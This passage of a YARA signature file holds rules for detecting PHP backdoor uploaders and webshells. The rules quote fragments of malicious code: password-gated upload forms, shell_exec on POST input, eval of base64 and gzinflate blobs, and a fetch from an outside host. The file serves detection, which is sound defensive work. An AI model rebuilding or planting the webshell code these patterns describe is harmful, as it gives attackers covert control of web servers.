        $ps0 = "wordpress page is ok"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_028 : backdoor
{
    strings:
        $trigger = "<form enctype=\"multipart/form-data\" method=\"POST\"><input"
    condition:
        $trigger and PR03391 and PR01648
}

private rule PR03392 : trigger
{
    strings:
        $ps0 = "if($_POST['upload'])"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_029 : backdoor
{
    strings:
        $trigger = ".php_uname()."
    condition:
        $trigger and PR03392 and PR02388
}

private rule PR03393 : trigger
{
    strings:
        $ps0 = "; if(file_exists($dir)){echo"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_030 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR03393 and PR01401
}

private rule PR03394 : trigger
{
    strings:
        $ps0 = "(md5($_SERVER[\"HTTP_USER_AGENT\"]) == base64_decode("
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_031 : backdoor
{
    strings:
        $trigger = "if (is_uploaded_file($"
    condition:
        $trigger and PR01468 and PR03394 and PR01431
}

private rule PR03395 : trigger
{
    strings:
        $ps0 = "fwrite(fopen($fname,'w'),$fcode); } }if(isset($_GET["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_032 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR03395
}

private rule PR03396 : trigger
{
    strings:
        $ps0 = "@scandir"
    condition:
        $ps0
}

private rule PR03397 : trigger
{
    strings:
        $ps0 = "($_POST['base_dir'])"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_033 : backdoor
{
    strings:
        $trigger = "<input type='text"
    condition:
        $trigger and PR00435 and PR03396 and PR03397
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_POST_035 : backdoor
{
    strings:
        $trigger = "isset($_POST["
        $php_backdoor_uploader_POST_035_r0 = /if[\s]*\([\s]*isset[\s]*\([\s]*\$_GET\[.[\w]+.\][\s]*\)[\s]*\)[\s]*\{[\s]*echo[^\{]+\{[\s]*if[\s]*\([\s]*copy[\s]*\(\$_FILES\[.[\w]+.\]\[.[\w]+.\][\s]*,[\s]*\$_POST\[.[\w]+.\][\s]*\)[\s]*\)[\s]*\{[\s]*echo\(/
    condition:
        $trigger and $php_backdoor_uploader_POST_035_r0
}

rule php_backdoor_uploader_POST_036 : backdoor
{
    strings:
        $trigger = "$target.basename( $_FILES['uploaded']['name'])"
    condition:
        $trigger and PR01648 and PR01021
}

private rule PR03398 : trigger
{
    strings:
        $ps0 = "$ini('php.ini', 'w');"
    condition:
        $ps0
}

private rule PR03399 : trigger
{
    strings:
        $ps0 = "$_SERVER['DOCUMENT_ROOT']"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_037 : backdoor
{
    strings:
        $trigger = "disable_functions=none"
    condition:
        $trigger and PR01362 and PR03366 and PR03398 and PR03365 and PR03399
}

// MANUAL FIX NECESSARY
private rule PR03400 : trigger
{
    strings:
        $ps0 = "$_POST[\"pass\"];"
    condition:
        $ps0
}

private rule PR03401 : trigger
{
    strings:
        $ps0 = "strtolower(end(explode("
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_038 : backdoor
{
    strings:
        $trigger = "isset"
        $php_backdoor_uploader_POST_038_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR03400 and PR03401 and $php_backdoor_uploader_POST_038_r0
}

private rule PR03402 : trigger
{
    strings:
        $ps0 = "<a href='$url'>Open Shell"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_039 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR03402
}

private rule PR03403 : trigger
{
    strings:
        $ps0 = "<input type=\"submit\" class=\"d7net_table"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_040 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR03403
}

private rule PR03404 : trigger
{
    strings:
        $ps0 = "if (md5(base64_decode($_REQUEST["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_041 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR03404 and PR01021
}

rule php_backdoor_uploader_POST_042 : backdoor
{
    strings:
        $trigger = "$path . basename( $_FILES['uploaded_file']['name']);"
    condition:
        $trigger and PR01648 and PR01021
}

rule php_backdoor_uploader_POST_042_02 : backdoor
{
    strings:
        $trigger = "if (is_file($file)) { echo  $file; } else { echo"
    condition:
        $trigger and PR00042 and PR00046 and PR02769 and PR00251
}

// MANUAL FIX NECESSARY
private rule PR03405 : trigger
{
    strings:
        $ps0 = "if(@move_uploaded_file($_FILES["
    condition:
        $ps0
}

private rule PR03406 : trigger
{
    strings:
        $ps0 = "$_POST['upl'])&&"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_044 : backdoor
{
    strings:
        $trigger = "isset"
        $php_backdoor_uploader_POST_044_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR03405 and PR03406 and $php_backdoor_uploader_POST_044_r0
}

rule php_backdoor_uploader_POST_045 : backdoor
{
    strings:
        $trigger = "KCRmaWxlc1siXHg2ZVx4NjFceDZkXHg2NSJdICE9ICcnKSB7ICRmdWxscGF0aCA9ICRfUkVRVUVTVFsiXDE2MFwxNDFceDc0XDE1MCJdIC4gJGZpbGVzW"
    condition:
        $trigger and PR01398
}

private rule PR03407 : trigger
{
    strings:
        $ps0 = "])){ if(move_uploaded_file($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_046 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR03407 and PR01369 and PR01021
}

rule php_backdoor_uploader_POST_047 : backdoor
{
    strings:
        $trigger = "($_FILES[base64_decode(chr("
    condition:
        $trigger and PR00029
}

private rule PR03408 : trigger
{
    strings:
        $ps0 = "(sha1(md5($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_048 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR03408 and PR03148
}

private rule PR03409 : trigger
{
    strings:
        $ps0 = "!isset($_COOKIE[md5($_SERVER["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_049 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR03409 and PR03148 and PR02769
}

private rule PR03410 : trigger
{
    strings:
        $ps0 = "UploadFile($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_050 : backdoor
{
    strings:
        $trigger = "is_uploaded_file($"
    condition:
        $trigger and PR00507 and PR03410
}

private rule PR03411 : trigger
{
    strings:
        $ps0 = ";if($_POST[\"v\"]==up){if(@copy($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_051 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR01382 and PR03101 and PR03411 and PR00397
}

private rule PR03412 : trigger
{
    strings:
        $ps0 = "input=file_get_contents("
    condition:
        $ps0
}

private rule PR03413 : trigger
{
    strings:
        $ps0 = ";@flock($fp,LOCK_UN);@fclose($fp);}}elseif(preg_match"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_052 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR03412 and PR03413
}

private rule PR03414 : trigger
{
    strings:
        $ps0 = "Gagal"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_053 : backdoor
{
    strings:
        $trigger = "@ini_get(\"disable_functions\")"
    condition:
        $trigger and PR03414 and PR02388
}

rule php_backdoor_uploader_POST_054 : backdoor
{
    strings:
        $trigger = "md5($_REQUEST["
    condition:
        $trigger and PR00046 and PR01021 and PR02769 and PR02870 and PR01648
}

private rule PR03415 : trigger
{
    strings:
        $ps0 = "php_uname()"
    condition:
        $ps0
}

private rule PR03416 : trigger
{
    strings:
        $ps0 = "up){if(@copy($"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_055 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03415 and PR00507 and PR03416
}

private rule PR03417 : trigger
{
    strings:
        $ps0 = "<form method=post"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_056 : backdoor
{
    strings:
        $trigger = "if(is_uploaded_file($_FILES["
    condition:
        $trigger and PR03148 and PR03417 and PR01021 and PR02769
}

private rule PR03418 : trigger
{
    strings:
        $ps0 = "$filename = $_SERVER[SCRIPT_FILENAME];"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_057 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR00046 and PR03418 and PR01021 and PR02769 and PR02870
}

private rule PR03419 : trigger
{
    strings:
        $ps0 = "@move_uploaded_file($"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_058 : backdoor
{
    strings:
        $trigger = "$maxfile"
    condition:
        $trigger and PR00046 and PR03419 and PR01021 and PR02769 and PR03137
}

private rule PR03420 : trigger
{
    strings:
        $ps0 = ");if($move) {echo"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_059 : backdoor
{
    strings:
        $trigger = "if(@$_GET["
    condition:
        $trigger and PR03420 and PR00046 and PR02769 and PR02870 and PR01648
}

private rule PR03421 : trigger
{
    strings:
        $ps0 = "substr(dirname(__FILE__), 0 , strrpos(dirname(__FILE__),"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_060 : backdoor
{
    strings:
        $trigger = "md5($_GET["
    condition:
        $trigger and PR03421
}

private rule PR03422 : trigger
{
    strings:
        $ps0 = ";@move_uploaded_file($azx, $name); echo $name;}else{ echo"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_061 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00046 and PR03422 and PR02769
}

private rule PR03423 : trigger
{
    strings:
        $ps0 = ");die();}}}else{if(isset($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_062 : backdoor
{
    strings:
        $trigger = "if(@copy($_FILES["
    condition:
        $trigger and PR03423 and PR00046
}

rule php_backdoor_uploader_POST_063 : backdoor
{
    strings:
        $trigger = "JHRvID0gInRlc3RjaGNla0BnbWFpbC5jb"
    condition:
        $trigger and PR01398
}

private rule PR03424 : trigger
{
    strings:
        $ps0 = ");}}else{@file_put_contents("
    condition:
        $ps0
}

private rule PR03425 : trigger
{
    strings:
        $ps0 = "])&&md5($_POST[$"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_064 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03424 and PR01428 and PR01021 and PR03425
}

rule php_backdoor_uploader_POST_065 : backdoor
{
    strings:
        $trigger = "(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))"
    condition:
        $trigger and PR01330 and PR00046
}

private rule PR03426 : trigger
{
    strings:
        $ps0 = "if($_FILES[\"filename\"][\"size\"] > 1024*6*1024)"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_066 : backdoor
{
    strings:
        $trigger = "if(is_uploaded_file($_FILES["
    condition:
        $trigger and PR00046 and PR03148 and PR03426 and PR01021 and PR02769
}

// MANUAL FIX NECESSARY
private rule PR03427 : trigger
{
    strings:
        $ps0 = "if (!empty($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_067 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
        $php_backdoor_uploader_POST_067_r0 = /move_uploaded_file\(\$_FILES\[.[\w]+.\]\[.[\w]+.\],\$_FILES\[/
        $php_backdoor_uploader_POST_067_r1 = /if\(isset\(\$_GET\[.[\w]+.\]\)\)/
    condition:
        $trigger and PR03427 and PR01021 and PR00046 and PR02769 and $php_backdoor_uploader_POST_067_r0 and $php_backdoor_uploader_POST_067_r1
}

rule php_backdoor_uploader_POST_068 : backdoor
{
    strings:
        $trigger = "form enctype=\\\"multipart/form-data\\\" method=\\\"POST\\\" action=\\\"?path="
    condition:
        $trigger and PR00435 and PR03385 and PR01529
}

private rule PR03428 : trigger
{
    strings:
        $ps0 = "&& isset($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_070 : backdoor
{
    strings:
        $trigger = "echo ($fname.' deleted successfully! <br"
    condition:
        $trigger and PR00265 and PR01362 and PR03428
}

private rule PR03429 : trigger
{
    strings:
        $ps0 = ";echo $_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_071 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR03429 and PR02388
}

private rule PR03430 : trigger
{
    strings:
        $ps0 = "echo \"<form"
    condition:
        $ps0
}

private rule PR03431 : trigger
{
    strings:
        $ps0 = "]==\"Upload\"){"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_072 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR03430 and PR02388 and PR03431
}

rule php_backdoor_uploader_POST_073 : backdoor
{
    strings:
        $trigger = "getcwd ().\"/\".$file.\"/\".$_POST["
    condition:
        $trigger and PR00435 and PR03396
}

// MANUAL FIX NECESSARY
private rule PR03432 : trigger
{
    strings:
        $ps0 = "echo file_get_contents($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_074 : backdoor
{
    strings:
        $trigger = "file_get_contents(urldecode($_POST["
        $php_backdoor_uploader_POST_074_r0 = /if[\s]*\(in_array[\s]*\(\"wp-config\.php\"[\s]*,[\s]*scandir[\s]*\([\s]*\$/
    condition:
        $trigger and PR03432 and $php_backdoor_uploader_POST_074_r0
}

private rule PR03433 : trigger
{
    strings:
        $ps0 = "{if(@copy($_FILES"
    condition:
        $ps0
}

private rule PR03434 : trigger
{
    strings:
        $ps0 = "{$_FILES[\"file\"][\"name\"]}"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_075 : backdoor
{
    strings:
        $trigger = "echo \"<form"
    condition:
        $trigger and PR03433 and PR03434 and PR02769
}

private rule PR03435 : trigger
{
    strings:
        $ps0 = "(move_uploaded_file($files['tmp_name'], $fullpath"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_076 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00046 and PR01021 and PR03435 and PR02769
}

private rule PR03436 : trigger
{
    strings:
        $ps0 = "if($_GET[\"payload\"]"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_077 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03436 and PR00046 and PR03148 and PR01021 and PR02769
}

rule php_backdoor_viaWormuploader_001 : backdoor
{
    strings:
        $trigger = "function __via_get_dir_file_paths"
    condition:
        $trigger and PR01648
}

private rule PR03437 : trigger
{
    strings:
        $ps0 = "define('vpsp_version"
    condition:
        $ps0
}

rule php_backdoor_vpsp_001 : backdoor
{
    strings:
        $trigger = "define('vpsp_pwd',"
    condition:
        $trigger and PR03437
}

rule php_backdoor_vpsp_001_002 : backdoor
{
    strings:
        $trigger = "define('vpsp_enc_key',"
    condition:
        $trigger
}

private rule PR03438 : trigger
{
    strings:
        $ps0 = "define('vpsp_pwd',"
    condition:
        $ps0
}

rule php_backdoor_vpsp_001_02 : backdoor
{
    strings:
        $trigger = "$GLOBALS['vpsp_pe'] = array"
    condition:
        $trigger and PR03438
}

rule php_backdoor_vpsp_001_03 : backdoor
{
    strings:
        $trigger = "(isset($_COOKIE['proxy']))"
    condition:
        $trigger and PR03438
}

rule php_backdoor_web51_001 : backdoor
{
    strings:
        $trigger = "@file_get_contents(\"http://web.51.la"
    condition:
        $trigger and PR00435
}

rule php_backdoor_webshell_001_001 : backdoor
{
    strings:
        $trigger = "Unknown Indonesian H4xx0r"
    condition:
        $trigger and PR00042
}

rule php_backdoor_webshell_002 : backdoor
{
    strings:
        $trigger = "$shell_fake_name = \""
    condition:
        $trigger
}

private rule PR03439 : trigger
{
    strings:
        $ps0 = "[$i] = chr(ord($"
    condition:
        $ps0
}

private rule PR03440 : trigger
{
    strings:
        $ps0 = "gzinflate($code($"
    condition:
        $ps0
}

rule php_backdoor_webshell_003 : backdoor
{
    strings:
        $trigger = "'e64_d'"
    condition:
        $trigger and PR00029 and PR03439 and PR03440
}

private rule PR03441 : trigger
{
    strings:
        $ps0 = "\"e64_d\""
    condition:
        $ps0
}

rule php_backdoor_webshell_003_02 : backdoor
{
    strings:
        $trigger = "gzinflate($code($"
    condition:
        $trigger and PR00029 and PR03439 and PR03441
}

rule php_backdoor_webshell_004 : backdoor
{
    strings:
        $trigger = "chr(39).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(39).chr(41).chr(41).chr(123"
    condition:
        $trigger and PR01483
}

rule php_backdoor_webshell_005 : backdoor
{
    strings:
        $trigger = "if((isset($_COOKIE[\"secureid\"]) && $_COOKIE[\"secureid\"] == md5($login_vng)) and (isset($_COOKIE[\"pass"
    condition:
        $trigger
}

rule php_backdoor_webshell_006 : backdoor
{
    strings:
        $trigger = "ftpall($_POST['ftpip'], $_POST['ftpuser'], $_POST['ftppass'], $_POST['goto']"
    condition:
        $trigger and PR00732
}

rule php_backdoor_webshell_007 : backdoor
{
    strings:
        $trigger = "$win = TRUE;else $win = FALSE;if(isset($_GET['y'])){if(@is_dir"
    condition:
        $trigger and PR00013
}

rule php_backdoor_webshell_008 : backdoor
{
    strings:
        $trigger = "$shell_code"
    condition:
        $trigger
}

private rule PR03442 : trigger
{
    strings:
        $ps0 = "=__FILE__;"
    condition:
        $ps0
}

private rule PR03443 : trigger
{
    strings:
        $ps0 = ";eval(($$"
    condition:
        $ps0
}

rule php_backdoor_webshell_009 : backdoor
{
    strings:
        $trigger = "kr9NHenNHenNHe1lFMamb3klFoxiC2APk19gOLlHOa9gkZXJkZwVkr9NTznNHr8XHt4JkZwS"
    condition:
        $trigger and PR03442 and PR03443
}

private rule PR03444 : trigger
{
    strings:
        $ps0 = "command_hist[current_line] = document.shell.command.value;"
    condition:
        $ps0
}

rule php_backdoor_webshell_010 : backdoor
{
    strings:
        $trigger = "$aliases = array('la' => 'ls -la',"
    condition:
        $trigger and PR03444
}

private rule PR03445 : trigger
{
    strings:
        $ps0 = "Priv8"
    condition:
        $ps0
}

rule php_backdoor_webshell_012 : backdoor
{
    strings:
        $trigger = "aWYgKC"
    condition:
        $trigger and PR03445
}

private rule PR03446 : trigger
{
    strings:
        $ps0 = "<b>Host Target:</b>"
    condition:
        $ps0
}

rule php_backdoor_webshell_013 : backdoor
{
    strings:
        $trigger = "aWYgKC"
    condition:
        $trigger and PR03446
}

rule php_backdoor_webshell_014 : backdoor
{
    strings:
        $trigger = "eval(base64_decode($lang));"
    condition:
        $trigger and PR02666
}

private rule PR03447 : trigger
{
    strings:
        $ps0 = "/* SYSTEM */ eval(base64_decode(\"IGV"
    condition:
        $ps0
}

rule php_backdoor_webshell_015 : backdoor
{
    strings:
        $trigger = "aWYgKC"
    condition:
        $trigger and PR03447
}

private rule PR03448 : trigger
{
    strings:
        $ps0 = "$_SESSION['nst']=\"$pass\";"
    condition:
        $ps0
}

rule php_backdoor_webshell_016 : backdoor
{
    strings:
        $trigger = "aWYgKC"
    condition:
        $trigger and PR03448
}

rule php_backdoor_webshell_017 : backdoor
{
    strings:
        $trigger = "ok>ini_ok"
    condition:
        $trigger and PR02666
}

rule php_backdoor_webshell_018 : backdoor
{
    strings:
        $trigger = "$ok = @file_put_contents(\"$testwrite/$md5.txt\", $time) !== false;"
    condition:
        $trigger and PR00732
}

private rule PR03449 : trigger
{
    strings:
        $ps0 = "<a href=\"?id=pwn_chmod&pwnd='.$file_color."
    condition:
        $ps0
}

rule php_backdoor_webshell_069 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR00013 and PR03449
}

private rule PR03450 : trigger
{
    strings:
        $ps0 = "echo base64_decode"
    condition:
        $ps0
}

rule php_backdoor_webshell_070 : backdoor
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR01659 and PR01382 and PR01789 and PR03450
}

private rule PR03451 : trigger
{
    strings:
        $ps0 = "<address>Apache Server at"
    condition:
        $ps0
}

private rule PR03452 : trigger
{
    strings:
        $ps0 = "$disable_functions = @ini_get('disable_functions');"
    condition:
        $ps0
}

private rule PR03453 : trigger
{
    strings:
        $ps0 = "$os = 'nix';"
    condition:
        $ps0
}

rule php_backdoor_webshell_071 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR03451 and PR03452 and PR03453
}

private rule PR03454 : trigger
{
    strings:
        $ps0 = "]),$outbuf);foreach($outbuf as $val) $outstr.=$val.chr"
    condition:
        $ps0
}

private rule PR03455 : trigger
{
    strings:
        $ps0 = ";exec(base64_decode($_COOKIE["
    condition:
        $ps0
}

rule php_backdoor_webshell_072 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03454 and PR03455
}

rule php_backdoor_webshell_073 : backdoor
{
    strings:
        $trigger = "if(!isset($_SESSION['login']) or $_SESSION['login'] != $xPassword){"
    condition:
        $trigger and PR01837 and PR01408
}

private rule PR03456 : trigger
{
    strings:
        $ps0 = "(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDcpOw0KQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsNCm9iX3N0YXJ0KCk7DQokbXRpbWUgIC"
    condition:
        $ps0
}

rule php_backdoor_webshell_074 : backdoor
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR03456
}

private rule PR03457 : trigger
{
    strings:
        $ps0 = "echo $confx_success.\"|"
    condition:
        $ps0
}

rule php_backdoor_webshell_075 : backdoor
{
    strings:
        $trigger = ", 0777, true);"
    condition:
        $trigger and PR00435 and PR03457
}

private rule PR03458 : trigger
{
    strings:
        $ps0 = "eWPIweXvcMlldoOzcbW+Nt9Md3ksNI0hNt9LDbC+Nt9jcB50cbw+eWP8R2kvcuL+eWPYtjXvDuOsde4YtJF7KX==alVnRPIq"
    condition:
        $ps0
}

rule php_backdoor_webshell_076 : backdoor
{
    strings:
        $trigger = "urldecode("
    condition:
        $trigger and PR00029 and PR03458
}

rule php_backdoor_webshell_077 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"rZrHCvTceqXnDb6H5"
    condition:
        $trigger
}

rule php_backdoor_webshell_077_02 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"rbpHj4Rss6a5Lyn"
    condition:
        $trigger
}

rule php_backdoor_webshell_077_03 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"7X37c9pI1ujPd6v2f2C8qc"
    condition:
        $trigger
}

rule php_backdoor_webshell_078 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('7L35dyTHdSb6c"
    condition:
        $trigger
}

rule php_backdoor_webshell_079 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('FZfFDsVIDkX3"
    condition:
        $trigger
}

rule php_backdoor_webshell_080 : backdoor
{
    strings:
        $trigger = "eval(base64_decode('Ly92ZXJzaW9uIDIKJ"
    condition:
        $trigger
}

private rule PR03459 : trigger
{
    strings:
        $ps0 = "eval(base64_decode('JHRhY2ZnZFsndGl0bGUnXSA9ICdYZ3IwdXBW"
    condition:
        $ps0
}

rule php_backdoor_webshell_081 : backdoor
{
    strings:
        $trigger = "['pword']"
    condition:
        $trigger and PR03459
}

rule php_backdoor_webshell_082 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(str_rot13(base64_decode('zUlbQttVFH5e"
    condition:
        $trigger
}

rule php_backdoor_webshell_082_02 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(str_rot13(base64_decode('rUl6QttVEP5eqf9u"
    condition:
        $trigger
}

rule php_backdoor_webshell_083 : backdoor
{
    strings:
        $trigger = "\"password\">Shell Password:"
    condition:
        $trigger and PR00732
}

rule php_backdoor_webshell_084 : backdoor
{
    strings:
        $trigger = "title>WebShell"
    condition:
        $trigger and PR00042
}

rule php_backdoor_webshell_085 : backdoor
{
    strings:
        $trigger = "$isReturnFiles = isset($_GET['isreturn'])?true:false;"
    condition:
        $trigger and PR01837
}

private rule PR03460 : trigger
{
    strings:
        $ps0 = "if ($_COOKIE['user'] != $user || $_COOKIE['pass'] != $pass)"
    condition:
        $ps0
}

rule php_backdoor_webshell_086 : backdoor
{
    strings:
        $trigger = ".\"<title>$sitetitle :: $title</title>"
    condition:
        $trigger and PR01362 and PR03460
}

private rule PR03461 : trigger
{
    strings:
        $ps0 = "JGF1dGhfcGFzcyA9ICR"
    condition:
        $ps0
}

private rule PR03462 : trigger
{
    strings:
        $ps0 = "\\x36\\x34"
    condition:
        $ps0
}

rule php_backdoor_webshell_087 : backdoor
{
    strings:
        $trigger = "\\x6F\\x64\\x65"
    condition:
        $trigger and PR03461 and PR00029 and PR03462
}

private rule PR03463 : trigger
{
    strings:
        $ps0 = "if($cmd != \"\") print Shell_Exec($cmd);"
    condition:
        $ps0
}

rule php_backdoor_webshell_088 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR03463
}

private rule PR03464 : trigger
{
    strings:
        $ps0 = "$output = shell_exec($_POST['_cmd']); echo"
    condition:
        $ps0
}

rule php_backdoor_webshell_089 : backdoor
{
    strings:
        $trigger = "fopen($_POST['_edit"
    condition:
        $trigger and PR03464
}

rule php_backdoor_webshell_090 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(\"Ly83MTg3OWQyMTJkYzhjYmY0ZDRmZ"
    condition:
        $trigger
}

private rule PR03465 : trigger
{
    strings:
        $ps0 = "array('f'=>base64_encode('<file>/x/x/x."
    condition:
        $ps0
}

rule php_backdoor_webshell_091 : backdoor
{
    strings:
        $trigger = "0777);"
    condition:
        $trigger and PR00203 and PR02201 and PR02203 and PR03465
}

rule php_backdoor_webshell_092 : backdoor
{
    strings:
        $trigger = "str_rot13('VPNiXv%cMvtuVTy_K29v*zIw@~9coy90LKuio"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR03466 : trigger
{
    strings:
        $ps0 = "eval(\"\\$a = $funcName(\\\"$input\\\");\");"
    condition:
        $ps0
}

rule php_backdoor_webshell_093 : backdoor
{
    strings:
        $trigger = "onfr64_qrpbqr"
    condition:
        $trigger and PR03466 and PR01372
}

rule php_backdoor_webshell_094 : backdoor
{
    strings:
        $trigger = "<title>lama's'hell"
    condition:
        $trigger
}

rule php_backdoor_webshell_095 : backdoor
{
    strings:
        $trigger = "<title>:: AventGrup ::.. - Sincap"
    condition:
        $trigger
}

private rule PR03467 : trigger
{
    strings:
        $ps0 = "<title>-Neutrino"
    condition:
        $ps0
}

rule php_backdoor_webshell_096 : backdoor
{
    strings:
        $trigger = ".php\">"
    condition:
        $trigger and PR03467
}

private rule PR03468 : trigger
{
    strings:
        $ps0 = "$taskdir = @mkdir('task_'.$_POST['task']);"
    condition:
        $ps0
}

rule php_backdoor_webshell_097 : backdoor
{
    strings:
        $trigger = "$content = preg_replace('/href=\"([^\\s\"]+)\"/', 'href=\""
    condition:
        $trigger and PR00435 and PR03468
}

private rule PR03469 : trigger
{
    strings:
        $ps0 = "function reload(){header(\"Location: \".basename(__FILE__))"
    condition:
        $ps0
}

rule php_backdoor_webshell_098 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR03469
}

private rule PR03470 : trigger
{
    strings:
        $ps0 = "elseif($toolsname === \"idxconfig"
    condition:
        $ps0
}

rule php_backdoor_webshell_099 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03470 and PR02124
}

rule php_backdoor_webshell_100 : backdoor
{
    strings:
        $trigger = "$sData   = gzinflate(ParseCode($sData));"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_backdoor_webshell_101 : backdoor
{
    strings:
        $trigger = "=\"QAAAOzh3b3cKDWJ1dWh1WHVidwAAaHVzbmlgLzAuPAoNR3RicwAAWGpmYG5kWHZyaHNidFh"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR03471 : trigger
{
    strings:
        $ps0 = "$backdoor_c="
    condition:
        $ps0
}

rule php_backdoor_webshell_102 : backdoor
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR03471 and PR01369 and PR01801
}

private rule PR03472 : trigger
{
    strings:
        $ps0 = "foreach (explode(\",\" , get_php_ini(unxor_this("
    condition:
        $ps0
}

rule php_backdoor_webshell_103 : backdoor
{
    strings:
        $trigger = "assthru"
    condition:
        $trigger and PR03472
}

private rule PR03473 : trigger
{
    strings:
        $ps0 = "3T1rd9s4rp/Tc/ofWG1mZN/63UynE8fuZPJoe7dNcvPo7E6S41UsOdbElrySnEfb"
    condition:
        $ps0
}

rule php_backdoor_webshell_104 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03473
}

private rule PR03474 : trigger
{
    strings:
        $ps0 = "1VVtT9swEP5cfoWpKpJI3XjrXkSBdYJOmsQ"
    condition:
        $ps0
}

rule php_backdoor_webshell_105 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03474
}

private rule PR03475 : trigger
{
    strings:
        $ps0 = "ibl13Z Private Shell"
    condition:
        $ps0
}

rule php_backdoor_webshell_106 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03475
}

private rule PR03476 : trigger
{
    strings:
        $ps0 = "7X15f9rIsuj/+f3yHRSu7wATjBGLbezYE+/Ge/DuJI8rkADFAjES2CY5eZ/9VVV3S60F2d"
    condition:
        $ps0
}

rule php_backdoor_webshell_107 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR03476 and PR00029
}

rule php_backdoor_webshell_108 : backdoor
{
    strings:
